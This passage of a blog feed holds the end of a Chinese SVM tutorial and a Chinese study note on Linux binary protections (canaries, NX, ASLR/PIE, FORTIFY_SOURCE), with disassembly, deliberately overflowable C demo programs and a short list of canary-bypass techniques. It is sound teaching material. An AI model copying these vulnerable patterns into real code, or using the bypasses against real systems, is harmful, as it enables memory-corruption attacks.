\sum_{i=1}^{n} x_{i}^{2} y_{i}^{2}+\sum_{i=2}^{n} \sum_{j=1}^{i-1}\left(\sqrt{2} x_{i} x_{j}\right)\left(\sqrt{2} y_{i} y_{j}\right)+\sum_{i=1} n\left(\sqrt{2} x_{i}\right)\left(\sqrt{2} y_{i}\right)+1
\]</span> 如果没有核函数，我们则需要把向量映射成: <span class="math display">\[
x^{\prime}=\left(x_{1}^{2}, \ldots, x_{n}^{2}, \ldots \sqrt{2} x_{1}, \ldots, \sqrt{2} x_{n}, 1\right)
\]</span> 然后在进行内积计算, 才能与多项式核函数达到相同的效果。</p>
<h4 id="常见核函数">常见核函数</h4>
<p>线性核函数 <span class="math display">\[
k\left(x_{i}, x_{j}\right)=x_{i}^{T} x_{j}
\]</span> 多项式核函数 <span class="math display">\[
k\left(x_{i}, x_{j}\right)=\left(x_{i}^{T} x_{j}\right)^{d}
\]</span> 高斯核函数 <span class="math display">\[
k\left(x_{i}, x_{j}\right)=\exp \left(-\frac{\left\|x_{i}-x_{j}\right\|}{2 \delta^{2}}\right)
\]</span></p>
<h2 id="使用sklearn实现">使用sklearn实现</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> svm</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">0</span>) <span class="comment"># 使用相同的seed()值，则每次生成的随即数都相同</span></span><br><span class="line"><span class="comment"># 创建可线性分类的数据集与结果集</span></span><br><span class="line">X = np.r_[np.random.randn(<span class="number">20</span>, <span class="number">2</span>) - [<span class="number">2</span>, <span class="number">2</span>], np.random.randn(<span class="number">20</span>,<span class="number">2</span>) + [<span class="number">2</span>, <span class="number">2</span>]]</span><br><span class="line">Y = [<span class="number">0</span>] * <span class="number">20</span> + [<span class="number">1</span>] * <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 SVM 模型</span></span><br><span class="line">clf = svm.SVC(kernel=<span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line">clf.fit(X, Y) <span class="comment"># 训练 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后就是收集这些数据来画平面图，因为这是一个二维的模型，因此可以假设超平面方程为 w0x + w1y + b = 0 转为点斜式就是: y = -(w0/w1)x - (b/w1) ：</span></span><br><span class="line">w = clf.coef_[<span class="number">0</span>]</span><br><span class="line">a = -w[<span class="number">0</span>] / w[<span class="number">1</span>] <span class="comment"># 斜率</span></span><br><span class="line">xx = np.linspace(-<span class="number">5</span>, <span class="number">5</span>) <span class="comment"># 在区间[-5, 5] 中产生连续的值，用于画线</span></span><br><span class="line">yy = a * xx - (clf.intercept_[<span class="number">0</span>]) / w[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">b = clf.support_vectors_[<span class="number">0</span>] <span class="comment"># 第一个分类的支持向量</span></span><br><span class="line">yy_down = a * xx + (b[<span class="number">1</span>] - a * b[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">b = clf.support_vectors_[-<span class="number">1</span>] <span class="comment"># 第二个分类中的支持向量</span></span><br><span class="line">yy_up = a * xx + (b[<span class="number">1</span>] - a * b[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> pylab <span class="keyword">as</span> pl</span><br><span class="line"></span><br><span class="line">pl.plot(xx, yy, <span class="string">&#x27;k-&#x27;</span>)</span><br><span class="line">pl.plot(xx, yy_down, <span class="string">&#x27;k--&#x27;</span>)</span><br><span class="line">pl.plot(xx, yy_up, <span class="string">&#x27;k--&#x27;</span>)</span><br><span class="line">pl.scatter(clf.support_vectors_[:, <span class="number">0</span>], clf.support_vectors_[:, <span class="number">1</span>],</span><br><span class="line">           s=<span class="number">80</span>, facecolors=<span class="string">&#x27;none&#x27;</span>)</span><br><span class="line">pl.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=Y, cmap=pl.cm.Paired)</span><br><span class="line"></span><br><span class="line">pl.axis(<span class="string">&#x27;tight&#x27;</span>)</span><br><span class="line">pl.show()</span><br></pre></td></tr></table></figure>
<h2 id="总结">总结</h2>
<h3 id="优点">优点</h3>
<ul>
<li>有严格的数学理论支持，可解释性强，不依靠统计方法，从而简化了通常的分类和回归问题；</li>
<li>能找出对任务至关重要的关键样本（即：支持向量）；</li>
<li>采用核技巧之后，可以处理非线性分类/回归任务；</li>
<li>最终决策函数只由少数的支持向量所确定，计算的复杂性取决于支持向量的数目，而不是样本空间的维数，这在某种意义上避免了“维数灾难”。</li>
</ul>
<h3 id="缺点">缺点</h3>
<ul>
<li>训练时间长。当采用 SMO 算法时，由于每次都需要挑选一对参数，因此时间复杂度为 <img src="https://www.zhihu.com/equation?tex=O%28N%5E2%29" alt="[公式]" /> ，其中 N 为训练样本的数量；</li>
<li>当采用核技巧时，如果需要存储核矩阵，则空间复杂度为 <img src="https://www.zhihu.com/equation?tex=O%28N%5E2%29" alt="[公式]" /> ；</li>
<li>模型预测时，预测时间与支持向量的个数成正比。当支持向量的数量较大时，预测计算复杂度较高。</li>
</ul>
<p>因此支持向量机目前只适合小批量样本的任务，无法适应百万甚至上亿样本的任务。</p>
<h2 id="参考">参考</h2>
<p>[1] <a href="https://zhuanlan.zhihu.com/p/77750026">【机器学习】支持向量机 SVM（非常详细） - 知乎 (zhihu.com)</a></p>
<p>[2] <a href="https://zhuanlan.zhihu.com/p/31886934">支持向量机（SVM）——原理篇 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>machine_learning</category>
      </categories>
      <tags>
        <tag>model</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn_protect</title>
    <url>/2022/07/02/pwn-protect.html</url>
    <content><![CDATA[<hr />
<p>对pwn过程中遇到的保护机制做一下详解与归纳。</p>
<h2 id="stack-canaries">Stack Canaries</h2>
<p>放一篇写的好的：<a href="https://www.cnblogs.com/ttxs69/p/pwn_canary.html">PWN之Canary学习 - sarace - 博客园 (cnblogs.com)</a></p>
<h3 id="简介">简介</h3>
<p>stack canaries取名自地下煤矿的金丝雀，能比矿工更快发现煤气泄露，有预警的作用。这个概念应用在栈保护上则是在<strong>初始化一个栈帧时在栈底设置一个随机的canary值</strong> ，栈帧销毁前测试该值是否“死掉”，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。</p>
<p>主要分为三类：<strong>terminator, random, random XOR</strong> ,具体实现有 <strong>StackGuard，StackShied, ProPoliced</strong> 等。</p>
<ul>
<li><p>terminator canaries: 考虑到很多栈溢出都是由于字符串操作不当所产生的，而这些字符串以NULL 00结尾， 被00截断，所有terminator将低位设置为，防止泄露，也可以防止伪造，截断字符还包括CR(0x0d),LF(0x0a), EOF(0xff)。其实就是将最后部分的最高位置为00，00ab1245</p></li>
<li><p>random canaries : 为了防止canaries被攻击者猜到，通常会在程序初始化的时候随机生成canary，保存在安全的地方。</p></li>
<li><p>random canaries XOR:其实就是比random canaries多了一个XOR操作，无论canaries还是XOR的数据被篡改，都会被检测到。xor eax,DWORD PTR gs:0x14</p></li>
</ul>
<h3 id="实现原理">实现原理</h3>
<p>Linux下，存在fs寄存器，用于保存线程局部存储TLS，TLS主要是为了避免多个线程访问同一全局变量或静态变量所导致的冲突。64位使用fs寄存器，偏移在0x28。32位使用gs寄存，偏移在0x14。该位置存储stack_guard，即保留和canary，最后和栈中的canary进行比较，检测溢出。</p>
<p>具体过程是使用_dl_random来生成stack_chk_guard，然后使用THREAD_SET_STACK_GUARD来设置stack_guard ，canary的最低位设置为。如果_dl_random==NULL，那么canary为定值。</p>
<p>如果程序没有定义THREAD_SET_STACK_GUARD宏，那么就会直接使用_stack_chk_guard，它是一个全局变量，放在.bss段中。</p>
<p>TLS结构体</p>
<p>x86 32位</p>
<figure class="highlight plaintext"><figcaption><span>Assembly</span></figcaption><table><tr><td class="code"><pre><span class="line">mov    eax,gs:0x14</span><br><span class="line">mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line"></span><br><span class="line">mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">xor    eax,DWORD PTR gs:0x14</span><br><span class="line">je     0x80492b2 &lt;vuln+103&gt; # 正常函数返回</span><br><span class="line">call   0x8049380 &lt;__stack_chk_fail_local&gt; # 调用出错处理函数</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><figcaption><span>Assembly</span></figcaption><table><tr><td class="code"><pre><span class="line">High  </span><br><span class="line">       Address |                 |  </span><br><span class="line">               +-----------------+</span><br><span class="line">               | args            |</span><br><span class="line">               +-----------------+</span><br><span class="line">               | return address  |</span><br><span class="line">               +-----------------+</span><br><span class="line">               | old ebp         |</span><br><span class="line">     ebp =&gt;    +-----------------+</span><br><span class="line">               | ebx             |</span><br><span class="line">   ebp-4 =&gt;    +-----------------+</span><br><span class="line">               | unknown         |</span><br><span class="line">   ebp-8 =&gt;    +-----------------+</span><br><span class="line">               | canary value    |</span><br><span class="line">  ebp-12 =&gt;    +-----------------+</span><br><span class="line">               | 局部变量         |</span><br><span class="line">       Low     |                 |</span><br><span class="line">       Address</span><br></pre></td></tr></table></figure>
<p>64位</p>
<figure class="highlight plaintext"><figcaption><span>Assembly</span></figcaption><table><tr><td class="code"><pre><span class="line">mov    rax,QWORD PTR fs:0x28</span><br><span class="line">mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line"></span><br><span class="line">mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rax,QWORD PTR fs:0x28</span><br><span class="line">je     0x401232 &lt;vuln+102&gt; # 正常函数返回</span><br><span class="line">call   0x401040 &lt;__stack_chk_fail@plt&gt; # 调用出错处理函数</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><figcaption><span>Assembly</span></figcaption><table><tr><td class="code"><pre><span class="line">High</span><br><span class="line">       Address |                 |</span><br><span class="line">               +-----------------+</span><br><span class="line">               | args            |</span><br><span class="line">               +-----------------+</span><br><span class="line">               | return address  |</span><br><span class="line">               +-----------------+</span><br><span class="line">               | old ebp         |</span><br><span class="line">     rbp =&gt;    +-----------------+</span><br><span class="line">               | canary value    |</span><br><span class="line">   rbp-8 =&gt;    +-----------------+</span><br><span class="line">               | 局部变量         |</span><br><span class="line">       Low     |                 |</span><br><span class="line">       Address</span><br></pre></td></tr></table></figure>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253247-1850220162.png" /></p>
<h3 id="实验">实验</h3>
<p>canary.c smash：粉碎，破碎，打破</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">gcc <span class="literal">-fno</span><span class="literal">-stack</span><span class="literal">-protector</span> canary.c <span class="literal">-o</span> canary_no.out</span><br><span class="line">gcc <span class="literal">-fstack</span><span class="literal">-protector</span> canary.c <span class="literal">-o</span> canary_pro.out</span><br></pre></td></tr></table></figure>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253082-1687133293.png" /></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253068-1776729338.png" /></p>
<h3 id="绕过方式">绕过方式</h3>
<ul>
<li><p>泄露内存中的canary，如通过格式化字符串漏洞打印出来</p></li>
<li><p>one-by-one爆破，但是一般是多线程的程序，产生新线程后canary不变才行。最高位为00。</p></li>
<li><p>劫持_stack_chk_fail函数，canary验证失败会进行该函数，__stack_chk_fail 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p></li>
<li><p>覆盖线程局部存储TLS中的canary，溢出尺寸比较大可以用。同时修改栈上的canary和TLS中的canary.</p></li>
</ul>
<h2 id="no-executenx">No-eXecute（NX）</h2>
<h3 id="简介-1">简介</h3>
<p>No-eXecute（NX）表示不可执行，其原理是将数据所在的内存页标识为不可执行。</p>
<p>在Linux中，程序载入内存后，将.text节标记为可执行，.data .bss等标记为不可执行，堆栈等均不可知性，传统的修改GOT表的方式不再可行。但是无法阻止代码重用攻击ret2libc</p>
<h3 id="实现">实现</h3>
<p>通过编译选项，使用strcmp比较，在_handle_option函数设置link_info结构体的execstack和noexecstack为true和false。</p>
<p>在bfd_elf_size_dynamic_sections函数中，根据link_info来设置elf_stack_flags = PF_R | PF_W | PF_X</p>
<p>开启了NX就只有两个，没有PF_X。</p>
<p>在_bfd_elf_map_sections_to_segments函数中，设置stuct elf_segment_map结构体中的p_flags=elf_stack_flags。就完成了编译设置。</p>
<p>在装载时，调用elf_load_binary函数，根据上面的p_flags来设置executable_stack=EXSTACK_ENABLE_X</p>
<p>或EXSTACK_DISABLE_X</p>
<p>将executable_stack传入setup_arg_pages中，通过vm_flags设置进程的虚拟内存空间vma。</p>
<p>当程序计数器指向了不可知性的内存页时，就会触发页错误。</p>
<h3 id="实验-1">实验</h3>
<p>nx.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>*argv[])</span></span>&#123;</span><br><span class="line">    vuln_func();</span><br><span class="line">    write(STDOUT_FILENO,<span class="string">&quot;Hello world!\n&quot;</span>,<span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253344-1833694897.png" /></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253196-268606348.png" /></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253213-2077211062.png" /></p>
<h2 id="aslr和pie">ASLR和PIE</h2>
<h3 id="简介-2">简介</h3>
<p>大多数攻击都需要知道程序的内存布局，引入内存布局的随机化可以增加漏洞利用的难度，<strong>地址空间布局随机化ASLR（address space layout randomization）</strong></p>
<p>ASLR /proc/sys/kernel/randomize_va_space有三种情况：</p>
<table>
<thead>
<tr class="header">
<th>ASLR</th>
<th>Executable</th>
<th>PLT</th>
<th>Heap</th>
<th>Stack</th>
<th>Shared Libraries</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0</td>
<td>不变</td>
<td>不变</td>
<td>不变</td>
<td>不变</td>
<td>不变</td>
</tr>
<tr class="even">
<td>1</td>
<td>不变</td>
<td>不变</td>
<td>不变</td>
<td>变</td>
<td>变</td>
</tr>
<tr class="odd">
<td>2</td>
<td>不变</td>
<td>不变</td>
<td>变</td>
<td>变</td>
<td>变</td>
</tr>
<tr class="even">
<td>2+pie</td>
<td>变</td>
<td>变</td>
<td>变</td>
<td>变</td>
<td>变</td>
</tr>
</tbody>
</table>
<p><strong>PIE</strong> 位置无关可执行文件，在应用层的编译器上实现，通过将程序编译为位置无关代码PIC，使程序加载到任意位置，就像是一个特殊的共享库。PIE会一定程度上影响性能。</p>
<h3 id="实验-2">实验：</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">stack</span>;</span><br><span class="line">    <span class="keyword">int</span> *heap=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="keyword">void</span> *handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>,RTLD_NOW | RTLD_GLOBAL);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;executable:%p\n&quot;</span>,&amp;main);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system@plt:%p\n&quot;</span>,&amp;system);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap: %p\n&quot;</span>,heap);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack: %p\n&quot;</span>,&amp;<span class="built_in">stack</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc: %p\n&quot;</span>,handle);</span><br><span class="line">    <span class="built_in">free</span>(heap);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253207-1651106603.png" /></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">echo</span> <span class="number">0</span>/<span class="number">1</span>/<span class="number">2</span> &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253169-1859287323.png" /></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253309-1823437057.png" /></p>
<p>ASLR=2，且开启PIE</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253221-334135671.png" /></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253308-901706542.png" /></p>
<h2 id="fortify_source">FORTIFY_SOURCE</h2>
<h3 id="简介-3">简介</h3>
<p>缓冲区溢出常常发生在程序调用了一些危险函数的时候，如memcpy，当源字符串的长度大于目的缓冲区时，就会发生缓冲区溢出。</p>
<p>FORTIFY_SOURCE本质上一种检查和替换机制，对GCC和glibc的一个安全补丁。</p>
<p>检查危险函数，并替换为安全函数，不会对程序的性能产生大的影响。目前支持memcpy, memmove, memset, strcpy, strncpy, strcat, strncat,sprintf, vsprintf, snprintf, vsnprintf, gets等。</p>
<h3 id="实现-1">实现</h3>
<p><strong>缓冲区溢出检查</strong> ，以安全函数<code>_strcpy_chk()</code>为例，可以看到该函数判断源数据长度是否大于目的缓冲区，是就调用<code>_chk_fail()</code>否则正常调用memcpy执行。</p>
<p><strong>格式化字符串检查</strong> ，以安全函数 <code>_printf_chk()</code>为例，针对%n和%N$两种格式化字符串。</p>
<h3 id="实验-3">实验</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>*argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">10</span>],buf2[<span class="number">10</span>],*s;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buf1,argv[<span class="number">1</span>],<span class="number">10</span>);           <span class="comment">//safe</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf2,<span class="string">&quot;AAAABBBBC&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>,buf1,buf2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buf1,argv[<span class="number">2</span>],atoi(argv[<span class="number">3</span>])); <span class="comment">//unknown</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf2,argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>,buf1,buf2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//memcpy(buf1,argv[1],11);         //unsafe</span></span><br><span class="line">    <span class="comment">//strcpy(buf2,&quot;AAAABBBBCC&quot;);</span></span><br><span class="line"></span><br><span class="line">    s=fgets(buf1,<span class="number">11</span>,<span class="built_in">stdin</span>);            <span class="comment">//fmt unknown</span></span><br><span class="line">    <span class="built_in">printf</span>(buf1,&amp;num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253354-633158759.png" /></p>
<p>使用gdb-pwndbg，反编译main</p>
<p>使用选项0 1 2 分别生成fortify0 1 2</p>
<p>gdb-pwndbg fortify1,可以看到替换成了安全函数,但是printf并没有被替换。</p>
<figure class="highlight plaintext"><figcaption><span>Assembly</span></figcaption><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001175 &lt;+0&gt;:     push   r12</span><br><span class="line">   0x0000000000001177 &lt;+2&gt;:     push   rbp</span><br><span class="line">   0x0000000000001178 &lt;+3&gt;:     push   rbx</span><br><span class="line">   0x0000000000001179 &lt;+4&gt;:     sub    rsp,0x20</span><br><span class="line">   0x000000000000117d &lt;+8&gt;:     mov    rbx,rsi</span><br><span class="line">   0x0000000000001180 &lt;+11&gt;:    mov    rax,QWORD PTR [rsi+0x8]</span><br><span class="line">   0x0000000000001184 &lt;+15&gt;:    mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x0000000000001187 &lt;+18&gt;:    mov    QWORD PTR [rsp+0x16],rdx</span><br><span class="line">   0x000000000000118c &lt;+23&gt;:    movzx  eax,WORD PTR [rax+0x8]</span><br><span class="line">   0x0000000000001190 &lt;+27&gt;:    mov    WORD PTR [rsp+0x1e],ax</span><br><span class="line">   0x0000000000001195 &lt;+32&gt;:    movabs rax,0x4242424241414141</span><br><span class="line">   0x000000000000119f &lt;+42&gt;:    mov    QWORD PTR [rsp+0xc],rax</span><br><span class="line">   0x00000000000011a4 &lt;+47&gt;:    mov    WORD PTR [rsp+0x14],0x43</span><br><span class="line">   0x00000000000011ab &lt;+54&gt;:    lea    r12,[rsp+0xc]</span><br><span class="line">   0x00000000000011b0 &lt;+59&gt;:    lea    rbp,[rsp+0x16]</span><br><span class="line">   0x00000000000011b5 &lt;+64&gt;:    mov    rdx,r12</span><br><span class="line">   0x00000000000011b8 &lt;+67&gt;:    mov    rsi,rbp</span><br><span class="line">   0x00000000000011bb &lt;+70&gt;:    lea    rdi,[rip+0xe42]        # 0x2004</span><br><span class="line">   0x00000000000011c2 &lt;+77&gt;:    mov    eax,0x0</span><br><span class="line">   0x00000000000011c7 &lt;+82&gt;:    call   0x1030 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000000011cc &lt;+87&gt;:    mov    rdi,QWORD PTR [rbx+0x18]</span><br><span class="line">   0x00000000000011d0 &lt;+91&gt;:    mov    edx,0xa</span><br><span class="line">   0x00000000000011d5 &lt;+96&gt;:    mov    esi,0x0</span><br><span class="line">   0x00000000000011da &lt;+101&gt;:   call   0x1050 &lt;strtol@plt&gt;</span><br><span class="line">   0x00000000000011df &lt;+106&gt;:   movsxd rdx,eax</span><br><span class="line">   0x00000000000011e2 &lt;+109&gt;:   mov    rsi,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00000000000011e6 &lt;+113&gt;:   mov    ecx,0xa</span><br><span class="line">   0x00000000000011eb &lt;+118&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00000000000011ee &lt;+121&gt;:   call   0x1040 &lt;__memcpy_chk@plt&gt;</span><br><span class="line">   0x00000000000011f3 &lt;+126&gt;:   mov    rsi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00000000000011f7 &lt;+130&gt;:   mov    edx,0xa</span><br><span class="line">   0x00000000000011fc &lt;+135&gt;:   mov    rdi,r12</span><br><span class="line">   0x00000000000011ff &lt;+138&gt;:   call   0x1070 &lt;__strcpy_chk@plt&gt;</span><br><span class="line">   0x0000000000001204 &lt;+143&gt;:   mov    rdx,r12</span><br><span class="line">   0x0000000000001207 &lt;+146&gt;:   mov    rsi,rbp</span><br><span class="line">   0x000000000000120a &lt;+149&gt;:   lea    rdi,[rip+0xdf3]        # 0x2004</span><br><span class="line">   0x0000000000001211 &lt;+156&gt;:   mov    eax,0x0</span><br><span class="line">   0x0000000000001216 &lt;+161&gt;:   call   0x1030 &lt;printf@plt&gt;</span><br><span class="line">   0x000000000000121b &lt;+166&gt;:   mov    rsi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x000000000000121f &lt;+170&gt;:   mov    ecx,0xa</span><br><span class="line">   0x0000000000001224 &lt;+175&gt;:   mov    edx,0xb</span><br><span class="line">   0x0000000000001229 &lt;+180&gt;:   mov    rdi,rbp</span><br><span class="line">   0x000000000000122c &lt;+183&gt;:   call   0x1040 &lt;__memcpy_chk@plt&gt;</span><br><span class="line">   0x0000000000001231 &lt;+188&gt;:   mov    edx,0xa</span><br><span class="line">   0x0000000000001236 &lt;+193&gt;:   lea    rsi,[rip+0xdce]        # 0x200b</span><br><span class="line">   0x000000000000123d &lt;+200&gt;:   mov    rdi,r12</span><br><span class="line">   0x0000000000001240 &lt;+203&gt;:   call   0x1070 &lt;__strcpy_chk@plt&gt;</span><br><span class="line">   0x0000000000001245 &lt;+208&gt;:   mov    rcx,QWORD PTR [rip+0x2e04]        # 0x4050 &lt;stdin@GLIBC_2.2.5&gt;</span><br><span class="line">   0x000000000000124c &lt;+215&gt;:   mov    edx,0xb</span><br><span class="line">   0x0000000000001251 &lt;+220&gt;:   mov    esi,0xa</span><br><span class="line">   0x0000000000001256 &lt;+225&gt;:   mov    rdi,rbp</span><br><span class="line">   0x0000000000001259 &lt;+228&gt;:   call   0x1060 &lt;__fgets_chk@plt&gt;</span><br><span class="line">   0x000000000000125e &lt;+233&gt;:   lea    rsi,[rsp+0x8]</span><br><span class="line">   0x0000000000001263 &lt;+238&gt;:   mov    rdi,rbp</span><br><span class="line">   0x0000000000001266 &lt;+241&gt;:   mov    eax,0x0</span><br><span class="line">   0x000000000000126b &lt;+246&gt;:   call   0x1030 &lt;printf@plt&gt;</span><br><span class="line">   0x0000000000001270 &lt;+251&gt;:   mov    eax,0x0</span><br><span class="line">   0x0000000000001275 &lt;+256&gt;:   add    rsp,0x20</span><br><span class="line">   0x0000000000001279 &lt;+260&gt;:   pop    rbx</span><br><span class="line">   0x000000000000127a &lt;+261&gt;:   pop    rbp</span><br><span class="line">   0x000000000000127b &lt;+262&gt;:   pop    r12</span><br><span class="line">   0x000000000000127d &lt;+264&gt;:   ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>gdb-pwndbg fortify2 <code>disas main</code>，可以看到printf也被替换成安全函数了。</p>
<figure class="highlight plaintext"><figcaption><span>Assembly</span></figcaption><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001175 &lt;+0&gt;:     push   r12</span><br><span class="line">   0x0000000000001177 &lt;+2&gt;:     push   rbp</span><br><span class="line">   0x0000000000001178 &lt;+3&gt;:     push   rbx</span><br><span class="line">   0x0000000000001179 &lt;+4&gt;:     sub    rsp,0x20</span><br><span class="line">   0x000000000000117d &lt;+8&gt;:     mov    rbx,rsi</span><br><span class="line">   0x0000000000001180 &lt;+11&gt;:    mov    rax,QWORD PTR [rsi+0x8]</span><br><span class="line">   0x0000000000001184 &lt;+15&gt;:    mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x0000000000001187 &lt;+18&gt;:    mov    QWORD PTR [rsp+0x16],rdx</span><br><span class="line">   0x000000000000118c &lt;+23&gt;:    movzx  eax,WORD PTR [rax+0x8]</span><br><span class="line">   0x0000000000001190 &lt;+27&gt;:    mov    WORD PTR [rsp+0x1e],ax</span><br><span class="line">   0x0000000000001195 &lt;+32&gt;:    movabs rax,0x4242424241414141</span><br><span class="line">   0x000000000000119f &lt;+42&gt;:    mov    QWORD PTR [rsp+0xc],rax</span><br><span class="line">   0x00000000000011a4 &lt;+47&gt;:    mov    WORD PTR [rsp+0x14],0x43</span><br><span class="line">   0x00000000000011ab &lt;+54&gt;:    lea    r12,[rsp+0xc]</span><br><span class="line">   0x00000000000011b0 &lt;+59&gt;:    lea    rbp,[rsp+0x16]</span><br><span class="line">   0x00000000000011b5 &lt;+64&gt;:    mov    rcx,r12</span><br><span class="line">   0x00000000000011b8 &lt;+67&gt;:    mov    rdx,rbp</span><br><span class="line">   0x00000000000011bb &lt;+70&gt;:    lea    rsi,[rip+0xe42]        # 0x2004</span><br><span class="line">   0x00000000000011c2 &lt;+77&gt;:    mov    edi,0x1</span><br><span class="line">   0x00000000000011c7 &lt;+82&gt;:    mov    eax,0x0</span><br><span class="line">   0x00000000000011cc &lt;+87&gt;:    call   0x1070 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x00000000000011d1 &lt;+92&gt;:    mov    rdi,QWORD PTR 